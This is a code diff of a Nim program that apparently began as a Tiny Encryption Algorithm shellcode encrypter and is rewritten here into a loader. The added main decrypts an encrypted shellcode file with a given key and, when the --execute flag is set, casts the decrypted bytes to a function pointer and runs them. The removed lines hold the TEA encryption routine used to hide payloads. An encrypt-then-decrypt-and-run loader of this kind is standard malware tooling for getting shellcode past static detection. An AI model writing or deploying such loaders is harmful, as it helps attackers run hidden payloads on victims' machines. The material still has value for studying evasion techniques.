@@ -3,70 +3,6 @@ import bitops
 import parseopt
 import os
 
-#
-#    References for the Encryption function:
-#        - https://it.wikipedia.org/wiki/Tiny_Encryption_Algorithm
-#        - https://link.springer.com/content/pdf/10.1007/3-540-60590-8_29.pdf
-#
-#    As per the reference, the function accepts the following arguments:
-#        - 'v': an array made up of 2 unsigned 32-bit integers (hence uint32)
-#            it contains 8 bytes of data to encrypt
-#        - 'k': an array made up of 4 uint32 integers, hence a 128-bits key
-#            it's the encryption key
-#
-#    As for how to encode data and key to uint32 integers, it's up to you
-#    In fact, in the original whitepaper I didn't find anything about
-#        this matter
-#
-proc encrypt(v: array[2, uint32], k: array[4, uint32]): array[2, uint32] =
-
-    #
-    #    Variables used by the encryption function.
-    #    Follows the difference between the 'let' and 'var' statements:
-    #        - 'let': After the initialization their value cannot change
-    #        - 'var': After the initialization their value CAN be changed
-    #
-    #    Moreover, by default the value of an integer is 0, so it doesn't need
-    #    to be inizialed to 0
-    #
-    let
-        #
-        #    According to the whitepaper:
-        #
-        #    > A different multiple of delta is used in each round so that no
-        #    > bit of the multiple will not change frequently. We suspect the
-        #    > algorithm is not very sensitive to the value of delta and we
-        #    > merely need to avoid a bad value.
-        #    > It will be noted that delta turns out to be odd with truncation
-        #    >  or nearest rounding, so no extra precautions are needed to
-        #    > ensure that all the digits of sum change.
-        #
-        delta: uint32 = cast[uint32](0x9e3779b9)
-
-        k0: uint32 = k[0]
-        k1: uint32 = k[1]
-        k2: uint32 = k[2]
-        k3: uint32 = k[3]
-    var
-        v0: uint32 = v[0]
-        v1: uint32 = v[1]
-        sum: uint32
-
-
-    #
-    #    The algorithm uses 32 cycles (64 rounds) to encrypt data 
-    #
-    for i in countup(0, 31):
-
-        sum += delta
-        v0 += ((v1 shl 4) + k0) xor (v1 + sum) xor ((v1 shr 5) + k1)
-        v1 += ((v0 shl 4) + k2) xor (v0 + sum) xor ((v0 shr 5) + k3)
-
-    #
-    #    Data is returned as an array of 2 uint32 integers, which represent 8
-    #        bytes of encrypted data
-    #
-    return [v0, v1]
 
 #
 #    The function 'encode' was written to encode 4 bytes of data into a uint32
@@ -221,99 +157,6 @@ proc decode(encrypted_chunk: uint32): array[4, byte] =
     var decrypted_bytes: array[4, byte] = cast[array[4, byte]](encrypted_chunk)
     return decrypted_bytes
 
-#
-#    Given a key (a string of 16 characters, so 128 bits) and a sequence of
-#        of bytes, it tries to encrypt them using the Tiny Encryption Algorithm
-#
-proc encrypt_shellcode(shellcode: seq[byte], key: string): seq[uint32] =
-
-    var v: array[2, uint32]
-    var k: array[4, uint32] = encode_key(key)
-
-    # I use a copy of the shellcode in order not to modify the original one,
-    #   later used for the Assert statement
-    var local_shellcode: seq[byte] = shellcode
-
-    echo "[+] Key: ", key
-    echo "[+] Encoded key: ", k
-    echo "[+] Shellcode without padding: ", local_shellcode
-    echo "\tLength: ", local_shellcode.len
-
-    #
-    #    Given TEA is a block cipher (e.g. AES CBC mode), it needs use padding
-    #        in the case of an input sequence of bytes not divisible by 8
-    #
-
-    let shellcode_padding = 8 - (local_shellcode.len mod 8)
-    for x in countup(0, shellcode_padding - 1):
-  
-        #
-        #    In this case I'm adding NULL bytes at the end of the original
-        #        shellcode, before encrypting it
-        #
-        local_shellcode.add(0x0)
-
-    echo "[+] Shellcode with padding: ", local_shellcode
-    echo "\tLength: ", local_shellcode.len
-
-    var byte_index: int
-    var encrypted_shellcode: seq[uint32]
-
-    #
-    #    For each 8 bytes of shellcode, the loop does the following:
-    #        1. take the first 4 bytes and convert them to an uint32 integer
-    #        2. take the next 4 bytes and convert them to an uint32 integer
-    #        3. encrypt the 8 bytes of shellcode using the 'encrypt' function
-    #        4. append the encrypted bytes to 'encrypted_shellcode' (array of
-    #            encrypted bytes)
-    #
-    for x in local_shellcode:
-
-        var b = local_shellcode[byte_index..(byte_index + 3)]
-        var byte_array: array[4, byte]
-        for i in countup(0, 3):
-            byte_array[i] = b[i]
-
-        # echo "[+] Bytes: ", b
-        # echo "[+] Array of bytes: ", byte_array
-        v[0] = encode(byte_array)
-
-        b = local_shellcode[(byte_index+4)..(byte_index + 7)]
-        for i in countup(0, 3):
-            byte_array[i] = b[i]
-
-        v[1] = encode(byte_array)
-
-        v = encrypt(v, k)
-
-        # echo "[+] Encrypted v0: ", v[0]
-        # echo "[+] Encrypted v1: ", v[1]
-
-        encrypted_shellcode.add(v[0])
-        encrypted_shellcode.add(v[1])
-
-        #
-        #    A word about for loops in Nim: the index is read-only, so you can't
-        #        perform operations on it.
-        #    To get the index:
-        #    
-        #    ```nim
-        #    for index, value in local_shellcode:
-        #        ...
-        #    ```
-        #
-        #    It seems every array or sequence has a built-in index, although
-        #        read-only, so you cannot do 'index += 8'
-        #
-        #    Because of this I'm using an external variable: 'byte_index'
-        #
-        byte_index += 8
-        
-        # If the next index is out of bonds, then break out of the for loop
-        if byte_index >= local_shellcode.len:
-            break
-
-    return encrypted_shellcode
 
 #
 #    The function 'decrypt_shellcode' retrieves 8 bytes from the sequence of
@@ -392,14 +235,14 @@ proc decrypt_shellcode(encrypted_shellcode: seq[byte], key: string): seq[byte] =
 #    Show usage of the program
 #
 proc writeHelp() =
-    echo "[+] Usage:\n\t", paramStr(0), " --input=shellcode.bin --output=encrypter.bin --key='0123456789abcdef'"
+    echo "[+] Usage:\n\t", paramStr(0), " --input=encrypted.bin --key='0123456789abcdef' [--output=decrypted.bin] [--execute]"
 
 proc main(): void =
-
 
     var input_file: string = ""
     var output_file: string = ""
     var enc_key: string = ""
+    var execute_shellcode: bool = false
 
     for kind, key, value in getOpt():
         case kind
@@ -417,6 +260,9 @@ proc main(): void =
             of "key", "k":
                 enc_key = value
 
+            of "e", "execute":
+                execute_shellcode = true
+
             else:
                 echo key
                 echo value
@@ -424,13 +270,15 @@ proc main(): void =
         of cmdEnd:
             discard
 
-    if input_file == "" or output_file == "" or enc_key == "":
+    if input_file == "" or enc_key == "":
         writeHelp()
         system.quit(1)
 
     echo "[+] Input shellcode: ", input_file
-    echo "[+] Output file: ", output_file
     echo "[+] Using encryption key: ", enc_key
+    if output_file != "":
+        echo "[+] Output file: ", output_file
+
     #
     #    After reading the input file containing the shellcode,
     #        e.g. shellcode.bin or a command-line argument, we have to copy each
@@ -438,54 +286,36 @@ proc main(): void =
     #        array of a specific data type
     #
     var fs = newFileStream(input_file, fmRead)
-    var shellcode_empty_array: array[1024, byte]
+    var encrypted_shellcode: seq[byte]
 
-    var shellcode: seq[byte]
     while not fs.atEnd:
         let b: byte = cast[byte](fs.readChar())
-        shellcode.add(b)
+        encrypted_shellcode.add(b)
 
+    # Decrypt the shellcode based on the input secret key
+    var decrypted_shellcode_bytes = decrypt_shellcode(encrypted_shellcode, enc_key)
+    echo "[+] Decrypted bytes: ", decrypted_shellcode_bytes
 
-    #
-    #    Once we filled the dynamic array with the bytes of our shellcode, it's
-    #        time to encrypt these bytes
-    #
-    var encrypted_shellcode: seq[uint32] = encrypt_shellcode(shellcode, enc_key)
+    # Write the decrypted shellcode to the output file, if set
+    if output_file != "":
+        echo "[+] Writing decrypted shellcode to file: ", output_file
+        writeFile(output_file, decrypted_shellcode_bytes) 
 
-    # echo "[+] Encrypted shellcode chunks: ", encrypted_shellcode
-    # echo "[+] Number of 4-bytes chunks: ", len(encrypted_shellcode)
+    if execute_shellcode:
+        var shellcode_empty_array: array[1024, byte]
+        for index, byte_value in decrypted_shellcode_bytes:
+            shellcode_empty_array[index] = byte_value
+        
+        let shellcode_pointer = cast[ByteAddress](shellcode_empty_array.addr)    
+        
+        # create function based on shellcode
+        var run_shellcode : (proc() {.cdecl, gcsafe.}) = cast[(proc() {.cdecl, gcsafe.})](shellcode_pointer)
 
-    #
-    #    Now that the shellcode is encrypted with TEA and our encryption key, we
-    #        got to convert the data structure returned by the decryption
-    #        function a dynamic array of bytes, so we can save them to file
-    #
-    var encrypted_shellcode_bytes: seq[byte]
-    for encrypted_chunk in encrypted_shellcode:
+        # in my case the function echo is based on fwrite, so you set a breakpoint on:
+        #   gef> b *fwrite
+        echo "[+] Running shellcode"
+        run_shellcode()
 
-        #
-        #    In this case, the decode function takes one uint32 integer and
-        #        converts it into 4 bytes, which are added to the dynamic array
-        #        (encrypted_shellcode_bytes)
-        #
-        var encrypted_chunk_bytes: array[4, byte] = decode(encrypted_chunk)
-
-        for b in encrypted_chunk_bytes:
-            encrypted_shellcode_bytes.add(b)
-
-    echo "[+] Saving encrypted shellcode to file: ", output_file
-    writeFile(output_file, encrypted_shellcode_bytes)
-
-    #
-    #    As to confirm whether the code and the encryption/decryption functions
-    #        work properly, I placed an assert statement at the bottom of the
-    #        code, comparing the original sequence of unencrypted bytes, with
-    #        the sequence of decrypted bytes
-    #
-    var decrypted_shellcode_bytes = decrypt_shellcode(encrypted_shellcode_bytes, enc_key)
-    
-    echo "[+] Decrypted shellcode: ", decrypted_shellcode_bytes
-    assert shellcode == decrypted_shellcode_bytes
 
 #
 #    Run the main function only if the program is run by itself, not imported
